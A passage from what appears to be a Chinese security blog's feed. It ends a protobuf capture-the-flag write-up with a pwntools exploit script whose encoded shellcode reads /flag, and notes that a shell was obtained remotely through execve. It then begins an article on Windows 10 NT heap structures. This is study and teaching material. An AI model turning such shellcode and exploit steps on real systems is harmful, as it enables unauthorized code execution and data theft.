class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;giao?\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;replenish\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">yes_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1fc7</span></span><br><span class="line">leak(<span class="string">&quot;yes_addr&quot;</span>,yes_addr)</span><br><span class="line">sl((<span class="built_in">hex</span>(yes_addr)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">giao=giao_pb2.devicemsg()</span><br><span class="line">giao.giaoid=<span class="number">1131796</span></span><br><span class="line">giao.giaosize=<span class="number">4281361</span></span><br><span class="line"><span class="comment"># giao.giaotoken=b&#x27;\x6A\x36\xAF\xA6\x7b\xA8\x5F\xB9\x63\x7D\x83\xC7\x0C\x1C\x8D\x91\xD3\xF2\x6E\x6B\xB3\xF9\x77\xF8\xBF\xE2\x88\xE8\xFC\xEC\xFD\x8E\xfd\x92\xFE\x40\x00&#x27;</span></span><br><span class="line">giao.giaotoken=<span class="string">b&#x27;87dd78e1-9025-4d57-9c2e-418608b3bbea&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.read(<span class="number">0</span>,<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x400</span>))</span><br><span class="line">new_shellcode=ae64.encode(shellcode,<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line"></span><br><span class="line">giao.giaocontent=new_shellcode</span><br><span class="line"><span class="comment"># debug(&quot;b *$rebase(0x0000000000001D67)&quot;)</span></span><br><span class="line">payload = giao.SerializeToString()</span><br><span class="line">sa(<span class="string">b&#x27;giao: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">orw_shell=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)+shellcraft.sendfile(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">48</span>))</span><br><span class="line">sl(<span class="number">0x100</span>*<span class="string">b&#x27;\x90&#x27;</span>+orw_shell)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>如此，不过比赛的时候，不知道为何远程环境没打通，但是通过execve直接getshell就通了，这个沙盒的第二个prctl返回值显示是<code>0xffffffff</code>，所以沙盒并没有完全开起来，还是可以进行getshell</p><blockquote><p>总的来说，protobuf pwn就是多了一个逆向结构体的过程，也大差不差了</p><p>有一个要注意的就是在发送protobuf pack后的字节序列的时候，应该通过send或sendafter，而不能用sendline，因为多了一个<code>\n</code>会导致unpack的失败，有一些师傅在这里会出问题</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于&lt;strong&gt;将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构&lt;/strong&gt;。所以很适合做数据存储和为不同语言，不同应</summary>
      
    
    
    
    <category term="protobuf" scheme="http://s1nec-1o.github.io/categories/protobuf/"/>
    
    
    <category term="protobuf" scheme="http://s1nec-1o.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>windows heap初探(2)</title>
    <link href="http://s1nec-1o.github.io/2025/05/10/windows-heap%E5%88%9D%E6%8E%A2-2/"/>
    <id>http://s1nec-1o.github.io/2025/05/10/windows-heap%E5%88%9D%E6%8E%A2-2/</id>
    <published>2025-05-10T07:18:42.000Z</published>
    <updated>2025-05-10T08:38:31.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows堆基础知识"><a href="#windows堆基础知识" class="headerlink" title="windows堆基础知识"></a>windows堆基础知识</h2><p>win10的memory allocator基本上分为两种：</p><ol><li>Nt Heap<ul><li>默认的memory allocator<ul><li>后端管理器（Back-End）</li><li>前端管理器（Front-End）</li></ul></li></ul></li><li>SegmentHeap<ul><li>Win10中全新的memory allocator机制</li></ul></li></ol><p>在LFH未启用时，我们call malloc</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519071.png" alt="image-20250508164639436"></p><p>启用LFH后，第一次或LFH能用的空间都用完时，会先跟Back-End要一大块空间来管理</p><p>启用LFH之后分配相同大小时，会直接给Front-End管理</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519072.png" alt="image-20250508164801386"></p><h3 id="Nt-Heap"><a href="#Nt-Heap" class="headerlink" title="Nt Heap"></a>Nt Heap</h3><h3 id="Back-End"><a href="#Back-End" class="headerlink" title="Back-End"></a>Back-End</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><h5 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h5><p><code>_HEAP</code>是每个堆的核心结构，用来管理该<code>heap</code>，每个<code>Heap</code>都有一个<code>_HEAP</code>在<code>heap</code>开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x2c0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_SEGMENT</span> <span class="title">Segment</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Entry</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">            ULONG SegmentSignature;                                         <span class="comment">//0x10</span></span><br><span class="line">            ULONG SegmentFlags;                                             <span class="comment">//0x14</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentListEntry</span>;</span>                            <span class="comment">//0x18</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span>* <span class="title">Heap</span>;</span>                                             <span class="comment">//0x28</span></span><br><span class="line">            VOID* BaseAddress;                                              <span class="comment">//0x30</span></span><br><span class="line">            ULONG NumberOfPages;                                            <span class="comment">//0x38</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">FirstEntry</span>;</span>                                 <span class="comment">//0x40</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">LastValidEntry</span>;</span>                             <span class="comment">//0x48</span></span><br><span class="line">            ULONG NumberOfUnCommittedPages;                                 <span class="comment">//0x50</span></span><br><span class="line">            ULONG NumberOfUnCommittedRanges;                                <span class="comment">//0x54</span></span><br><span class="line">            USHORT SegmentAllocatorBackTraceIndex;                          <span class="comment">//0x58</span></span><br><span class="line">            USHORT Reserved;                                                <span class="comment">//0x5a</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRSegmentList</span>;</span>                              <span class="comment">//0x60</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG ForceFlags;                                                       <span class="comment">//0x74</span></span><br><span class="line">    ULONG CompatibilityFlags;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG Interceptor;                                                      <span class="comment">//0x90</span></span><br><span class="line">    ULONG VirtualMemoryThreshold;                                           <span class="comment">//0x94</span></span><br><span class="line">    ULONG Signature;                                                        <span class="comment">//0x98</span></span><br><span class="line">    ULONGLONG SegmentReserve;                                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONGLONG SegmentCommit;                                                <span class="comment">//0xa8</span></span><br><span class="line">    ULONGLONG DeCommitFreeBlockThreshold;                                   <span class="comment">//0xb0</span></span><br><span class="line">    ULONGLONG DeCommitTotalFreeThreshold;                                   <span class="comment">//0xb8</span></span><br><span class="line">    ULONGLONG TotalFreeSize;                                                <span class="comment">//0xc0</span></span><br><span class="line">    ULONGLONG MaximumAllocationSize;                                        <span class="comment">//0xc8</span></span><br><span class="line">    USHORT ProcessHeapsListIndex;                                           <span class="comment">//0xd0</span></span><br><span class="line">    USHORT HeaderValidateLength;                                            <span class="comment">//0xd2</span></span><br><span class="line">    VOID* HeaderValidateCopy;                                               <span class="comment">//0xd8</span></span><br><span class="line">    USHORT NextAvailableTagIndex;                                           <span class="comment">//0xe0</span></span><br><span class="line">    USHORT MaximumTagIndex;                                                 <span class="comment">//0xe2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TAG_ENTRY</span>* <span class="title">TagEntries</span>;</span>                                     <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRList</span>;</span>                                             <span class="comment">//0xf0</span></span><br><span class="line">    ULONGLONG AlignRound;                                                   <span class="comment">//0x100</span></span><br><span class="line">    ULONGLONG AlignMask;                                                    <span class="comment">//0x108</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">VirtualAllocdBlocks</span>;</span>                                 <span class="comment">//0x110</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentList</span>;</span>                                         <span class="comment">//0x120</span></span><br><span class="line">    USHORT AllocatorBackTraceIndex;                                         <span class="comment">//0x130</span></span><br><span class="line">    ULONG NonDedicatedListLength;                                           <span class="comment">//0x134</span></span><br><span class="line">    VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line">    VOID* UCRIndex;                                                         <span class="comment">//0x140</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_PSEUDO_TAG_ENTRY</span>* <span class="title">PseudoTagEntries</span>;</span>                        <span class="comment">//0x148</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LOCK</span>* <span class="title">LockVariable</span>;</span>                                        <span class="comment">//0x160</span></span><br><span class="line">    LONG (*CommitRoutine)(VOID* arg1, VOID** arg2, ULONGLONG* arg3);        <span class="comment">//0x168</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">RTL_RUN_ONCE</span> <span class="title">StackTraceInitVar</span>;</span>                                  <span class="comment">//0x170</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_HEAP_MEMORY_LIMIT_DATA</span> <span class="title">CommitLimitData</span>;</span>                     <span class="comment">//0x178</span></span><br><span class="line">    VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">    USHORT FrontHeapLockCount;                                              <span class="comment">//0x1a0</span></span><br><span class="line">    UCHAR FrontEndHeapType;                                                 <span class="comment">//0x1a2</span></span><br><span class="line">    UCHAR RequestedFrontEndHeapType;                                        <span class="comment">//0x1a3</span></span><br><span class="line">    WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br><span class="line">    USHORT FrontEndHeapMaximumIndex;                                        <span class="comment">//0x1b0</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR FrontEndHeapStatusBitmap[<span class="number">129</span>];                           <span class="comment">//0x1b2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_COUNTERS</span> <span class="title">Counters</span>;</span>                                         <span class="comment">//0x238</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TUNING_PARAMETERS</span> <span class="title">TuningParameters</span>;</span>                        <span class="comment">//0x2b0</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br></pre></td></tr></table></figure><p><code>EncodeFlagMask</code>是用来判断是否要encode该heap中chunk的header</p><p><code>Encoding</code>用来与chunk header做xor的<code>cookie</code></p><blockquote><p>所有的chunk都会经过xor，在存入chunk header时，会将整个<code>header^(_HEAP-&gt;Encoding)</code>再存入</p><p>decode时会验证，确保没被改掉，验证方式为：先异或回原来的值，然后前三个byte异或后和第四个byte比对</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br></pre></td></tr></table></figure><p><code>BlocksIndex</code>是Back-End的重要结构，之后会详细讲解</p><p><code>FreeList</code>串接Back-End中的所有free chunk，类似unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br></pre></td></tr></table></figure><p><code>FrontEndHeap</code>指向管理Front-End的Heap的结构</p><p><code>FrontEndHeapUsageData</code>指向一个对应各大小的chunk的阵列，记录各种大小chunk使用次数，到达某种程度时会采用Front-End allocater</p><h5 id="HEAP-ENTRY-chunk"><a href="#HEAP-ENTRY-chunk" class="headerlink" title="_HEAP_ENTRY(chunk)"></a>_HEAP_ENTRY(chunk)</h5><p>_HEAP_ENTRY(chunk)</p><ul><li>分为三种情况<ul><li>Allocated chunk</li><li>Freed chunk</li><li>VirtualAlloc chunk</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_UNPACKED_ENTRY</span> <span class="title">UnpackedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* PreviousBlockPrivateData;                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT Size;                                            <span class="comment">//0x8</span></span><br><span class="line">                    UCHAR Flags;                                            <span class="comment">//0xa</span></span><br><span class="line">                    UCHAR SmallTagIndex;                                    <span class="comment">//0xb</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG SubSegmentCode;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT PreviousSize;                                    <span class="comment">//0xc</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        UCHAR SegmentOffset;                                <span class="comment">//0xe</span></span><br><span class="line">                        UCHAR LFHFlags;                                     <span class="comment">//0xe</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                    UCHAR UnusedBytes;                                      <span class="comment">//0xf</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG CompactHeader;                                    <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_EXTENDED_ENTRY</span> <span class="title">ExtendedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* Reserved;                                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT FunctionIndex;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT ContextValue;                                    <span class="comment">//0xa</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONG InterceptorValue;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">            USHORT UnusedBytesLength;                                       <span class="comment">//0xc</span></span><br><span class="line">            UCHAR EntryOffset;                                              <span class="comment">//0xe</span></span><br><span class="line">            UCHAR ExtendedBlockSignature;                                   <span class="comment">//0xf</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* ReservedForAlignment;                                     <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG Code1;                                            <span class="comment">//0x8</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                        &#123;</span></span><br><span class="line">                            USHORT Code2;                                   <span class="comment">//0xc</span></span><br><span class="line">                            UCHAR Code3;                                    <span class="comment">//0xe</span></span><br><span class="line">                            UCHAR Code4;                                    <span class="comment">//0xf</span></span><br><span class="line">                        &#125;;</span><br><span class="line">                        ULONG Code234;                                      <span class="comment">//0xc</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG AgregateCode;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p> 虽说这个结构体有点复杂，但是是取决于这个chunk的状态的</p><p><strong>Inused状态</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;<span class="comment">//0x0</span></span><br><span class="line">    Uint2B Size;<span class="comment">//0x8</span></span><br><span class="line">    Uchar Flags;<span class="comment">//0xa</span></span><br><span class="line">    Uchar SmallTagIndex;<span class="comment">//0xb</span></span><br><span class="line">    Uint2B PreviousSize;<span class="comment">//0xc</span></span><br><span class="line">    Uchar SegmentOffset;<span class="comment">//0xe</span></span><br><span class="line">    Uchar Unusedbyte;<span class="comment">//0xf</span></span><br><span class="line">    Uchar UserData[];<span class="comment">//0x10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PreviousBlockPrivateData</code>基本上是前一块chunk的数据</p><p><code>Size</code>存入的方式是(size&gt;&gt;4)即0x10对齐</p><p><code>Flag</code>表示该chunk是否inused</p><p><code>SmallTagIndex</code>是<code>Size</code>和<code>Flags</code>成员三字节数据逐个xor结果, 取出时会进行校验</p><p><code>PreviousSize</code>是相邻前一块chunk的Size，一样是&gt;&gt;4过后的数值</p><p><code>SegmentOffset</code>某些情况用来找segment</p><p><code>Unusebyte</code>记录user malloc后所剩的chunk空间，可以用来判断chunk的状态是FrontEnd or BackEnd</p><p><code>UserData</code>是User所使用的区块</p><p><strong>freed状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _HEAP_ENTRY&#123;</span><br><span class="line">    void * PreviousBlockPrivateData;//0x0</span><br><span class="line">    Uint2B Size;//0x8</span><br><span class="line">    Uchar Flags;//0xa</span><br><span class="line">    Uchar SmallTagIndex;//0xb</span><br><span class="line">    Uint2B PreviousSize;//0xc</span><br><span class="line">    Uchar SegmentOffset;//0xe</span><br><span class="line">    Uchar Unusedbyte;//0xf</span><br><span class="line">    struct _LIST_ENTRY* Flink;//0x10</span><br><span class="line">    struct _LIST_ENTRY* Blink;//0x18</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Flink</code>指向linked list中下一块chunk</p><p><code>Blink</code>指向linked list中上一块chunk</p><p><code>Unusedbyte</code>恒为0</p><h5 id="HEAP-VIRTUAL-ALLOC-ENTRY-mmap-chunk"><a href="#HEAP-VIRTUAL-ALLOC-ENTRY-mmap-chunk" class="headerlink" title="_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk)"></a>_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x40 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_VIRTUAL_ALLOC_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">Entry</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span> <span class="title">ExtraStuff</span>;</span>                                    <span class="comment">//0x10</span></span><br><span class="line">    ULONGLONG CommitSize;                                                   <span class="comment">//0x20</span></span><br><span class="line">    ULONGLONG ReserveSize;                                                  <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">BusyBlock</span>;</span>                                           <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Flink</span>;</span>                                              <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Blink</span>;</span>                                              <span class="comment">//0x8</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT AllocatorBackTraceIndex;                                 <span class="comment">//0x0</span></span><br><span class="line">            USHORT TagIndex;                                                <span class="comment">//0x2</span></span><br><span class="line">            ULONGLONG Settable;                                             <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONGLONG ZeroInit;                                             <span class="comment">//0x0</span></span><br><span class="line">            ULONGLONG ZeroInit1;                                            <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>BusyBlock</code>的结构体和上述的chunk的结构体是类似的</p><p>其中</p><p><code>Size</code>是指的是<code>unused size</code>，存储时也没有进行<code>size &gt;&gt; 4</code>的<code>shift</code>操作</p><p><code>UnusedBytes</code>恒为4</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519073.png" alt="image-20250508160927164" style="zoom: 50%;" /><p>在Free完一块chunk后，会将该chunk放在FreeLists中，会按照大小决定插入的位置</p><h5 id="HEAP-BlocksIndex"><a href="#HEAP-BlocksIndex" class="headerlink" 